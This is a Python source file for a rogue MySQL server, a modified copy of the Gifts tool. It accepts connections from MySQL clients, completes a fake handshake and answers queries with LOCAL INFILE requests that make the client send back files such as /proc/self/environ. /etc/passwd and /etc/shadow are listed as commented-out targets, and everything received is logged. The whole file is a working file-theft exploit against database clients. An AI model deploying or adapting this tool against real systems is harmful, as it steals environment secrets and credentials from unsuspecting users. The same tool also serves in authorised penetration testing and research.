#!/usr/bin/env python
#coding: utf8
#Modified Copy of https://raw.githubusercontent.com/Gifts/Rogue-MySql-Server/master/rogue_mysql_server.py
#Copyright (c) 2013, Gifts
#Modification (c) 2019 oneiroi{at}fedoraproject.org

import socket
import asyncore
import asynchat
import struct
import random
import logging
import logging.handlers
from string import lowercase

PORT = 3307

log = logging.getLogger(__name__)

log.setLevel(logging.DEBUG)
tmp_format = logging.handlers.WatchedFileHandler('mysql.log', 'ab')
tmp_format.setFormatter(logging.Formatter("%(asctime)s:%(levelname)s:%(message)s"))
log.addHandler(
    tmp_format
)

filelist = (
#    r'c:\boot.ini',
    #r'c:\windows\win.ini',
     r'/proc/self/environ',
   # note relative paths such as ~ do not appear to be expanded, your requested file path must be the full path
   # r'/etc/hostname',       #test known file
   # r'/etc/hosts',          #Hosts file _could_ contain interesting artefacts
#    r'c:\windows\system32\drivers\etc\hosts',
#    '/etc/passwd',
#    '/etc/shadow',
)


#================================================
#=======No need to change after this lines=======
#================================================

__author__ = 'Gifts, Oneiroi'

def daemonize():
    import os, warnings
    if os.name != 'posix':
        warnings.warn('Cant create daemon on non-posix system')
        return
    #daemonmizing is not required for limited testing, you may wish to add threading howeverw
    return

    """if os.fork(): os._exit(0)
    os.setsid()
    if os.fork(): os._exit(0)
    os.umask(0o022)
    null=os.open('/dev/null', os.O_RDWR)
    for i in xrange(3):
        try:
            os.dup2(null, i)
        except OSError as e:
            if e.errno != 9: raise
    os.close(null)"""


class LastPacket(Exception):
    pass


class OutOfOrder(Exception):
    pass


class mysql_packet(object):
    packet_header = struct.Struct('<Hbb')
    packet_header_long = struct.Struct('<Hbbb')
    def __init__(self, packet_type, payload):
        if isinstance(packet_type, mysql_packet):
            self.packet_num = packet_type.packet_num + 1
        else:
            self.packet_num = packet_type
        self.payload = payload

    def __str__(self):
        payload_len = len(self.payload)
        if payload_len < 65536:
            header = mysql_packet.packet_header.pack(payload_len, 0, self.packet_num)
        else:
            header = mysql_packet.packet_header.pack(payload_len & 0xFFFF, payload_len >> 16, 0, self.packet_num)

        result = "{0}{1}".format(
            header,
            self.payload
        )
        return result

    def __repr__(self):
        return repr(str(self))

    @staticmethod
    def parse(raw_data):
        packet_num = ord(raw_data[0])
        payload = raw_data[1:]

        return mysql_packet(packet_num, payload)


class http_request_handler(asynchat.async_chat):

    def __init__(self, addr):
        asynchat.async_chat.__init__(self, sock=addr[0])
        self.addr = addr[1]
        self.ibuffer = []
        self.set_terminator(3)
        self.state = 'LEN'
        self.sub_state = 'Auth'
        self.logined = False

        #What follows is summary in comment form from the mysql documentation
        #From: https://dev.mysql.com/doc/dev/mysql-server/latest/page_protocol_connection_phase.html

        #1. exchnage capabilities of client and server
        #2. Setup SSL/TLS communication if requested
        #3. authenticate against the server

        #after the initial handhsake. server informs client about the method to be used for auth,
        #unless it was already established during the handshake, and the auth exchnage continues until either
        #server accepts connection and send OK_Packet or rjectes with ERR_Packet

        #Do not adverstise ssl capability, as this adds overhead (Add support later)
        #Handle auth 
        #1. Send handshake, (sans SSL/TLS capability).
        #2. Interpret response packet.
        #3. Send malicious payload to trigger LOCAL file upload to $server

        #https://dev.mysql.com/doc/dev/mysql-server/latest/page_protocol_connection_phase_packets_protocol_handshake_v10.html
        #Protocol::HandshakeV10
        #int<1> - protocol version - always 10
        #string<nul> - server version - human readable status info
        #int<4> - tread id - aka connection id
        #string<8> - auth-plugin-data-part-1 - first 8 bytes of plugin provided data (scramble)
        #int<1> - filler - 0x00 byte, terminating the first part of scramble
        #int<2> - capability_flags_1 - lower two bytes of Capabilities flags
        #int<2> - character_set - default a_protocol_character_set, only the lower 8-bits
        #int<2>  = status_flags - SERVER_STATUS_flags_enum
        #int<2>  - capability_flags_2 - the upper 2 bytes of Capabilities flags
        #int<1>  - if capabilities & CLIENT_PLUGIN_AUTH plugin_data_len ELSE 0x00
        #string[10] - reserved - reserved (not used) all 0's 
        # $length - auth_plugin_data_part-2 - Rest of plugin provided data (scramble), $len=MAX(13, len(auth_plugin_data)==8)
       
        self.push(
            mysql_packet(
                0,
                "".join((
                    '\x0a',  # mysql.protocol
                    #'3.0.0-Evil_Mysql_Server' + '\0',  # Version
                    '5.1.66-0+squeeze1' + '\0', #mysql.version
                    '\x36\x00\x00\x00',  # mysql.thread_id
                    ''.join(random.choice(lowercase) for _ in range(7)) + '\0',  # mysql.salt (7bytes)
                    '\xff\xf7',  # mysql.caps.sc
                    '\x08',  # mysql.server_language
                    '\x02\x00',  # mysql.stat.ps_out_params
                    '\0' * 12,  # mysql.caps.unused + mysql.auth_plugin.length + mysql.unused
                    ''.join(random.choice(lowercase) for _ in range(9)) + '\0',  # mysql.salt2 (9bytes)
                ))
            )
        )

        self.order = 1
        self.states = ['LOGIN', 'CAPS', 'ANY']

    def push(self, data):
        log.debug('Pushed: %r', data)
        data = str(data)
        asynchat.async_chat.push(self, data)

    def collect_incoming_data(self, data):
        log.debug('Data recved: %r', data)
        self.ibuffer.append(data)

    def found_terminator(self):
        data = "".join(self.ibuffer)
        self.ibuffer = []

        if self.state == 'LEN':
            len_bytes = ord(data[0]) + 256*ord(data[1]) + 65536*ord(data[2]) + 1
            if len_bytes < 65536:
                self.set_terminator(len_bytes)
                self.state = 'Data'
            else:
                self.state = 'MoreLength'
        elif self.state == 'MoreLength':
            if data[0] != '\0':
                self.push(None)
                self.close_when_done()
            else:
                self.state = 'Data'
        elif self.state == 'Data':
            packet = mysql_packet.parse(data)
            try:
                if self.order != packet.packet_num:
                    raise OutOfOrder()
                else:
                    # Fix ?
                    self.order = packet.packet_num + 2
                if packet.packet_num == 0:
                    if packet.payload[0] == '\x03':
                        log.info('Query')

                        filename = random.choice(filelist)
                        PACKET = mysql_packet(
                            packet,
                            '\xFB{0}'.format(filename)
                        )
                        self.set_terminator(3)
                        self.state = 'LEN'
                        self.sub_state = 'File'
                        self.push(PACKET)
                    elif packet.payload[0] == '\x1b':
                        log.info('SelectDB')
                        self.push(mysql_packet(
                            packet,
                            '\xfe\x00\x00\x02\x00'
                        ))
                        raise LastPacket()
                    elif packet.payload[0] in '\x02':
                        self.push(mysql_packet(
                            packet, '\0\0\0\x02\0\0\0'
                        ))
                        raise LastPacket()
                    elif packet.payload == '\x00\x01':
                        self.push(None)
                        self.close_when_done()
                    else:
                        raise ValueError()
                else:
                    if self.sub_state == 'File':
                        log.info('-- result')
                        log.info('Result: %r', data)

                        if len(data) == 1:
                            self.push(
                                mysql_packet(packet, '\0\0\0\x02\0\0\0')
                            )
                            raise LastPacket()
                        else:
                            self.set_terminator(3)
                            self.state = 'LEN'
                            self.order = packet.packet_num + 1

                    elif self.sub_state == 'Auth':
                        self.push(mysql_packet(
                            packet, '\0\0\0\x02\0\0\0'
                        ))
                        raise LastPacket()
                    else:
                        log.info('-- else')
                        raise ValueError('Unknown packet')
            except LastPacket:
                log.info('Last packet')
                self.state = 'LEN'
                self.sub_state = None
                self.order = 0
                self.set_terminator(3)
            except OutOfOrder:
                log.warning('Out of order')
                self.push(None)
                self.close_when_done()
        else:
            log.error('Unknown state')
            self.push('None')
            self.close_when_done()


class mysql_listener(asyncore.dispatcher):
    def __init__(self, sock=None):
        asyncore.dispatcher.__init__(self, sock)

        if not sock:
            self.create_socket(socket.AF_INET, socket.SOCK_STREAM)
            self.set_reuse_addr()
            try:
                self.bind(('', PORT))
            except socket.error:
                exit()

            self.listen(5)

    def handle_accept(self):
        pair = self.accept()

        if pair is not None:
            log.info('Conn from: %r', pair[1])
            tmp = http_request_handler(pair)


z = mysql_listener()
daemonize()
asyncore.loop()
